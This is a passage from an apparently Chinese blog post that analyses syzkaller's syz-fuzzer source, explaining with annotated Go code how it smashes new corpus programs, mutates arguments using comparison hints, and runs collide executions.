class="hljs-type">byte</span>)(unsafe.Pointer(callReply))[:]<br><span class="hljs-keyword">if</span> _, err := io.ReadFull(c.inrp, callReplyData); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> callReply.signalSize != <span class="hljs-number">0</span> || callReply.coverSize != <span class="hljs-number">0</span> || callReply.compsSize != <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// 暂不支持.</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;executor %v: got call reply with coverage\n&quot;</span>, c.pid)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-built_in">copy</span>(outmem, callReplyData)<br>outmem = outmem[<span class="hljs-built_in">len</span>(callReplyData):]<br>*completedCalls++<br>&#125;<br></code></pre></td></tr></table></figure><p>syz-fuzzer 接收 syz-executor 返回数据的示例如下图所示：</p><p><img src="https://s2.loli.net/2023/04/24/seE43rD2uaXCbwj.png" alt="image.png"></p><p>最后检查本次执行结果，如果说执行结果一切顺利则直接返回，<strong>否则会终止 syz-executor 的继续运行</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">close</span>(done)<br><span class="hljs-keyword">if</span> exitStatus == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Program was OK.</span><br>&lt;-hang<br><span class="hljs-keyword">return</span><br>&#125;<br>c.cmd.Process.Kill()<br>output = &lt;-c.readDone<br><span class="hljs-keyword">if</span> err := c.wait(); &lt;-hang &#123;<br>hanged = <span class="hljs-literal">true</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>output = <span class="hljs-built_in">append</span>(output, err.Error()...)<br>output = <span class="hljs-built_in">append</span>(output, <span class="hljs-string">&#x27;\n&#x27;</span>)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> exitStatus == <span class="hljs-number">-1</span> &#123;<br>exitStatus = osutil.ProcessExitStatus(c.cmd.ProcessState)<br>&#125;<br><span class="hljs-comment">// 忽略其他的所有错误.</span><br><span class="hljs-comment">// 在没有 fork server 的情况下 executor 可以合法地退出 (program contains exit_group),</span><br><span class="hljs-comment">// 在带有 fork server 的情况下若 top process 想要特殊的处理，则其可以带着 statusFail 退出.</span><br><span class="hljs-keyword">if</span> exitStatus == statusFail &#123;<br>err0 = fmt.Errorf(<span class="hljs-string">&quot;executor %v: exit status %d\n%s&quot;</span>, c.pid, exitStatus, output)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="③-proc-smashInput-：执行并变异刚刚被加入到语料库中的程序【核心】"><a href="#③-proc-smashInput-：执行并变异刚刚被加入到语料库中的程序【核心】" class="headerlink" title="③ proc.smashInput()：执行并变异刚刚被加入到语料库中的程序【核心】"></a>③ proc.smashInput()：执行并变异刚刚被加入到语料库中的程序【核心】</h3><p><code>proc.smashInput()</code> 用以<strong>执行并变异刚刚被加入到语料库中的程序</strong>（即 <code>WorkSmash</code> ）：</p><ul><li>首先检查 <code>faultInjectionEnabled</code> ，若设置了则调用 <code>proc.failCall()</code> <ul><li>该函数用以将一个 fault 注入到程序中，其会循环一百次，设置 <code>newProg.Calls[call].Props.FailNth = nth</code> （<code>newProg</code> 为输入程序的克隆）后调用 <code>proc.executeRaw()</code> 进行执行</li></ul></li><li>接下来检查 <code>comparisonTracingEnabled</code> ，若设置了则调用 <code>proc.executeHintSeed()</code> <strong>使用 hint 进行变异</strong></li><li>随后获取 syz-fuzzer 当前快照，并循环一百次：<strong>调用</strong> <code>prog.Mutate()</code> <strong>将输入程序进行变异后再调用</strong> <code>proc.executeAndCollide()</code> <strong>执行变异后的程序</strong></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> smashInput(item *WorkSmash) &#123;<br><span class="hljs-keyword">if</span> proc.fuzzer.faultInjectionEnabled &amp;&amp; item.call != <span class="hljs-number">-1</span> &#123;<br>proc.failCall(item.p, item.call)<br>&#125;<br><span class="hljs-keyword">if</span> proc.fuzzer.comparisonTracingEnabled &amp;&amp; item.call != <span class="hljs-number">-1</span> &#123;<br>proc.executeHintSeed(item.p, item.call)<br>&#125;<br>fuzzerSnapshot := proc.fuzzer.snapshot()<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>p := item.p.Clone()<br>p.Mutate(proc.rnd, prog.RecommendedCalls, proc.fuzzer.choiceTable, proc.fuzzer.noMutate, fuzzerSnapshot.corpus)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: smash mutated&quot;</span>, proc.pid)<br>proc.executeAndCollide(proc.execOpts, p, ProgNormal, StatSmash)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>变异函数 <code>prog.Mutate()</code> 我们将在下一节中深入分析，本节我们先来看另外两个函数：</p><h4 id="proc-executeHintSeed-：使用-hint-变异程序并执行"><a href="#proc-executeHintSeed-：使用-hint-变异程序并执行" class="headerlink" title="proc.executeHintSeed()：使用 hint 变异程序并执行"></a>proc.executeHintSeed()：使用 hint 变异程序并执行</h4><p>该函数首先会将输入程序执行一次，接下来调用 <code>prog.MutateWithHints</code> 使用执行所得的 CompMap <strong>对输入程序中的一些参数值进行替换</strong>，最后再将该输入程序执行一次：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> executeHintSeed(p *prog.Prog, call <span class="hljs-type">int</span>) &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: collecting comparisons&quot;</span>, proc.pid)<br><span class="hljs-comment">// 首先执行原始程序以从 KCOV 获取比较值.</span><br>info := proc.execute(proc.execOptsComps, p, ProgNormal, StatSeed)<br><span class="hljs-keyword">if</span> info == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// 接下来为每个系统调用参数于一个比较操作数的匹配对变异原始程序.</span><br><span class="hljs-comment">// 执行每一个这样的变异，以检查是否给出了新的覆盖率.</span><br>p.MutateWithHints(call, info.Calls[call].Comps, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *prog.Prog)</span></span> &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: executing comparison hint&quot;</span>, proc.pid)<br>proc.execute(proc.execOpts, p, ProgNormal, StatHint)<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>MutateWithHints()</code> 当中输入进程会先被克隆一份，接下来使用 <code>ForeachArg</code> 遍历指定系统调用中的每个参数，并传入了一些闭包函数套娃（套中套中套属于是）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 使用存储在 compMaps中的比较操作数变异程序.</span><br><span class="hljs-comment">// 对于每个变种，执行 exec 回调.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Prog)</span></span> MutateWithHints(callIndex <span class="hljs-type">int</span>, comps CompMap, exec <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Prog)</span></span>) &#123;<br>p = p.Clone()<br>c := p.Calls[callIndex]<br>execValidate := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 不要尝试修复 candidate 程序.</span><br><span class="hljs-comment">// 假设原来的调用被 sanitized, 我们会得到一个坏的调用作为 hint 的替代结果，将其丢掉就行.</span><br><span class="hljs-keyword">if</span> p.Target.sanitize(c, <span class="hljs-literal">false</span>) != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>p.debugValidate()<br>exec(p)<br>&#125;<br>ForeachArg(c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(arg Arg, _ *ArgCtx)</span></span> &#123;<br>generateHints(comps, arg, execValidate)<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>类似于我们上文分析的 <code>ForeachType()</code>，<code>ForeachArg()</code> 会为该调用的返回值与每一个参数都调用 <code>foreachArgImpl()</code>，该函数首先会调用上层传入的闭包 <code>generateHints()</code>，接下来会根据参数类型进行不同操作：</p><ul><li><code>GroupArg</code> （逻辑上的一组参数，即<strong>结构体</strong>与<strong>数组</strong>）：获取并遍历其中的每个成员，递归调用 <code>foreachArgImpl()</code></li><li><code>PointerArg</code> （指针类型）：判断其指向 （pointee）是否为 nil，若否，递归调用 <code>foreachArgImpl()</code></li><li><code>UnionArg</code>  （联合体类型）：递归调用 <code>foreachArgImpl()</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ForeachArg</span><span class="hljs-params">(c *Call, f <span class="hljs-keyword">func</span>(Arg, *ArgCtx)</span></span>) &#123;<br>ctx := &amp;ArgCtx&#123;&#125;<br><span class="hljs-keyword">if</span> c.Ret != <span class="hljs-literal">nil</span> &#123;<br>foreachArgImpl(c.Ret, ctx, f)<br>&#125;<br>ctx.Parent = &amp;c.Args<br>ctx.Fields = c.Meta.Args<br><span class="hljs-keyword">for</span> _, arg := <span class="hljs-keyword">range</span> c.Args &#123;<br>foreachArgImpl(arg, ctx, f)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foreachArgImpl</span><span class="hljs-params">(arg Arg, ctx *ArgCtx, f <span class="hljs-keyword">func</span>(Arg, *ArgCtx)</span></span>) &#123;<br>ctx0 := *ctx<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; *ctx = ctx0 &#125;()<br>f(arg, ctx)<br><span class="hljs-keyword">if</span> ctx.Stop &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">switch</span> a := arg.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *GroupArg:<br>overlayField := <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> typ, ok := a.Type().(*StructType); ok &#123;<br>ctx.Parent = &amp;a.Inner<br>ctx.Fields = typ.Fields<br>overlayField = typ.OverlayField<br>&#125;<br><span class="hljs-keyword">var</span> totalSize <span class="hljs-type">uint64</span><br><span class="hljs-keyword">for</span> i, arg1 := <span class="hljs-keyword">range</span> a.Inner &#123;<br><span class="hljs-keyword">if</span> i == overlayField &#123;<br>ctx.Offset = ctx0.Offset<br>&#125;<br>foreachArgImpl(arg1, ctx, f)<br>size := arg1.Size()<br>ctx.Offset += size<br><span class="hljs-keyword">if</span> totalSize &lt; ctx.Offset &#123;<br>totalSize = ctx.Offset - ctx0.Offset<br>&#125;<br>&#125;<br>claimedSize := a.Size()<br>varlen := a.Type().Varlen()<br><span class="hljs-keyword">if</span> varlen &amp;&amp; totalSize &gt; claimedSize || !varlen &amp;&amp; totalSize != claimedSize &#123;<br><span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;bad group arg size %v, should be &lt;= %v for %#v type %#v&quot;</span>,<br>totalSize, claimedSize, a, a.Type().Name()))<br>&#125;<br><span class="hljs-keyword">case</span> *PointerArg:<br><span class="hljs-keyword">if</span> a.Res != <span class="hljs-literal">nil</span> &#123;<br>ctx.Base = a<br>ctx.Offset = <span class="hljs-number">0</span><br>foreachArgImpl(a.Res, ctx, f)<br>&#125;<br><span class="hljs-keyword">case</span> *UnionArg:<br>foreachArgImpl(a.Option, ctx, f)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们来看 <code>generateHints()</code> 函数，该函数首先会调用 <code>Arg</code> 接口的 <code>Type()</code> 函数获取类型并进行判断，对于大部分类型好像都是直接返回，仅有以下通过：</p><ul><li><code>ConstType</code>：会检查 <code>IsPad</code> 标志位，若不为真才会继续</li><li><code>BufferType</code> 中的 <code>BufferString, BufferGlob</code>：会检查值的长度，为 0 才会继续</li><li>其他的不在如下代码中的类型</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">generateHints</span><span class="hljs-params">(compMap CompMap, arg Arg, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>typ := arg.Type()<br><span class="hljs-keyword">if</span> typ == <span class="hljs-literal">nil</span> || arg.Dir() == DirOut &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">switch</span> t := typ.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *ProcType:<br><span class="hljs-comment">// 随机的程序不会通过验证.</span><br><span class="hljs-comment">// 我们可以将其变异，但仅当结果值在合法范围内.</span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> *ConstType:<br><span class="hljs-keyword">if</span> IsPad(typ) &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">case</span> *CsumType:<br><span class="hljs-comment">// Csum 将不会通过验证，且总会被计算.</span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> *BufferType:<br><span class="hljs-keyword">switch</span> t.Kind &#123;<br><span class="hljs-keyword">case</span> BufferFilename:<br><span class="hljs-comment">// 其可以生成逃逸路径，且通常不会太有用.</span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> BufferString, BufferGlob:<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(t.Values) != <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// 这些通常是文件名或完整的枚举。</span><br><span class="hljs-comment">// 若我们拦截 strcmp，将其变异可能是有用的</span><br><span class="hljs-comment">// (并过滤掉文件名).</span><br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> 最后会根据参数实际的存储类型进行判断：</p><ul><li>对于常量参数 <code>ConstArg</code> 类型会调用 <code>checkConstArg()</code> 处理</li><li>对于数据参数 <code>DataArg</code> 类型，首先会判断是否为 <code>BufferCompressed</code> 类型，若是则调用 <code>checkCompressedArg()</code> ，否则调用 <code>checkDataArg()</code> 处理</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> a := arg.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *ConstArg:<br>checkConstArg(a, compMap, exec)<br><span class="hljs-keyword">case</span> *DataArg:<br><span class="hljs-keyword">if</span> typ.(*BufferType).Kind == BufferCompressed &#123;<br>checkCompressedArg(a, compMap, exec)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>checkDataArg(a, compMap, exec)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这三个函数都会调用到 <code>shrinkExpand()</code>，所以我们先来看看这个函数的实现，该函数用以<strong>使用给定的 CompMap 对参数进行替换，返回结果为可以用来进行替换的新参数值</strong>，其具体实现我们就不深入了，这里来看注释：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Shrink and expand mutations 在当系统调用参数被转化为更狭窄（与更宽阔）的整型类型时</span><br><span class="hljs-comment">// 对这些情况进行建模.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 收缩的动机:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//void f(u16 x) &#123;</span><br><span class="hljs-comment">//u8 y = (u8)x;</span><br><span class="hljs-comment">//if (y == 0xab) &#123;...&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 若我们调用 f(0x1234), 我们将看到在 0x34 与 0xab 间的比较，</span><br><span class="hljs-comment">// 我们将没法将参数 0x1234 与任何比较操作数匹配.</span><br><span class="hljs-comment">// 由此我们将 0x1234 收缩到 0x34 并尝试匹配 0x34.</span><br><span class="hljs-comment">// 若对于收缩后的值存在一个匹配，则我们替换输入中相应的字节</span><br><span class="hljs-comment">//  (在给出的例子中我们将获得 0x12ab).</span><br><span class="hljs-comment">// 有的时候其他的比较操作数将比收缩后的值要宽</span><br><span class="hljs-comment">// (在上面的例子中考虑比较 if (y == 0xdeadbeef) &#123;...&#125;).</span><br><span class="hljs-comment">// 这种情况下我们忽略这样的比较因为我们无法给出做着类似事情的合法代码🌰.</span><br><span class="hljs-comment">// 为了避免这样的比较，我们我们使用 leastSize() 检查其 size. </span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 扩展的动机:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//void f(i8 x) &#123;</span><br><span class="hljs-comment">//i16 y = (i16)x;</span><br><span class="hljs-comment">//if (y == -2) &#123;...&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 假如我们调用 f(-1), 我们将看到在 0xffff 与 0xfffe 间的比较，</span><br><span class="hljs-comment">// 并无法将输入与任何操作数匹配. 由此我们对输入进行符号扩展并检查扩展.</span><br><span class="hljs-comment">// 与收缩一样，我们忽略了另一个操作数更宽的情况.</span><br><span class="hljs-comment">// 需要注意的是 executor 将所有的比较操作数符号扩展至 int64.</span><br></code></pre></td></tr></table></figure><p>下面我们来看这三个 <code>check*Arg()</code> ，我们首先看用来处理常量的 <code>checkConstArg()</code>，主要逻辑是嗲用 <code>shrinkExpand()</code> 并对其结果（<code>CompMap</code> 类型）进行遍历，将 <code>arg.Val</code> 依次替换为其提供的 replacer 值，并调用上层回调函数（也就是 <code>execValidate()</code> ，里面还会调用上层传入的闭包函数，最后会调用 <code>proc.execute()</code> ，也就是说<strong>对于 shrinkExpand() 提供的每个替换结果其都会执行一次</strong>）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkConstArg</span><span class="hljs-params">(arg *ConstArg, compMap CompMap, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>original := arg.Val<br><span class="hljs-comment">// Note: because shrinkExpand returns a map, order of programs is non-deterministic.</span><br><span class="hljs-comment">// This can affect test coverage reports.</span><br><span class="hljs-keyword">for</span> _, replacer := <span class="hljs-keyword">range</span> shrinkExpand(original, compMap, arg.Type().TypeBitSize(), <span class="hljs-literal">false</span>) &#123;<br>arg.Val = replacer<br>exec()<br>&#125;<br>arg.Val = original<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来看 <code>checkCompressedArg()</code> ，主要就是将数据解压后逐 4 字节进行遍历，每次遍历时都会再调用 <code>shrinkExpand()</code> 获取可替换值并再对其结果进行遍历，调用上层传入的闭包函数执行替换数据后的程序：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkCompressedArg</span><span class="hljs-params">(arg *DataArg, compMap CompMap, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>data0 := arg.Data()<br>data, dtor := image.MustDecompress(data0)<br><span class="hljs-keyword">defer</span> dtor()<br><span class="hljs-comment">// Images are very large so the generic algorithm for data arguments</span><br><span class="hljs-comment">// can produce too many mutants. For images we consider only</span><br><span class="hljs-comment">// 4/8-byte aligned ints. This is enough to handle all magic</span><br><span class="hljs-comment">// numbers and checksums. We also ignore 0 and ^uint64(0) source bytes,</span><br><span class="hljs-comment">// because there are too many of these in lots of images.</span><br>bytes := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(data); i += <span class="hljs-number">4</span> &#123;<br>original := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br><span class="hljs-built_in">copy</span>(original, data[i:])<br>val := binary.LittleEndian.Uint64(original)<br><span class="hljs-keyword">for</span> _, replacer := <span class="hljs-keyword">range</span> shrinkExpand(val, compMap, <span class="hljs-number">64</span>, <span class="hljs-literal">true</span>) &#123;<br>binary.LittleEndian.PutUint64(bytes, replacer)<br><span class="hljs-built_in">copy</span>(data[i:], bytes)<br>arg.SetData(image.Compress(data))<br>exec()<br>&#125;<br><span class="hljs-built_in">copy</span>(data[i:], original)<br>&#125;<br>arg.SetData(data0)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>checkDataArg()</code> 逻辑基本上与 <code>checkCompressedArg()</code> 一致，不过是逐字节遍历且没有解压过程：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkDataArg</span><span class="hljs-params">(arg *DataArg, compMap CompMap, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>bytes := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br>data := arg.Data()<br>size := <span class="hljs-built_in">len</span>(data)<br><span class="hljs-keyword">if</span> size &gt; maxDataLength &#123;<br>size = maxDataLength<br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; size; i++ &#123;<br>original := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br><span class="hljs-built_in">copy</span>(original, data[i:])<br>val := binary.LittleEndian.Uint64(original)<br><span class="hljs-keyword">for</span> _, replacer := <span class="hljs-keyword">range</span> shrinkExpand(val, compMap, <span class="hljs-number">64</span>, <span class="hljs-literal">false</span>) &#123;<br>binary.LittleEndian.PutUint64(bytes, replacer)<br><span class="hljs-built_in">copy</span>(data[i:], bytes)<br>exec()<br>&#125;<br><span class="hljs-built_in">copy</span>(data[i:], original)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="proc-executeAndCollide-：简易的变异执行："><a href="#proc-executeAndCollide-：简易的变异执行：" class="headerlink" title="proc.executeAndCollide()：简易的变异执行："></a>proc.executeAndCollide()：简易的变异执行：</h4><p>该函数的逻辑比较简单，首先会将程序执行一次，之后循环执行两次，不过会调用 <code>proc.randomCollide()</code> 先将原始程序进行处理后再执行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> executeAndCollide(execOpts *ipc.ExecOpts, p *prog.Prog, flags ProgTypes, stat Stat) &#123;<br>proc.execute(execOpts, p, flags, stat)<br><br><span class="hljs-keyword">if</span> proc.execOptsCollide.Flags&amp;ipc.FlagThreaded == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// We cannot collide syscalls without being in the threaded mode.</span><br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">const</span> collideIterations = <span class="hljs-number">2</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; collideIterations; i++ &#123;<br>proc.executeRaw(proc.execOptsCollide, proc.randomCollide(p), StatCollide)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>randomCollide()</code> 流程如下：</p><ul><li>首先会有 20% 的几率调用 <code>prog.DoubleExecCollide()</code> （把源程序拷贝一份附加到其自身的末，并使用第一部分的资源），若未出错则直接返回</li><li>接下来有 20% 的几率调用 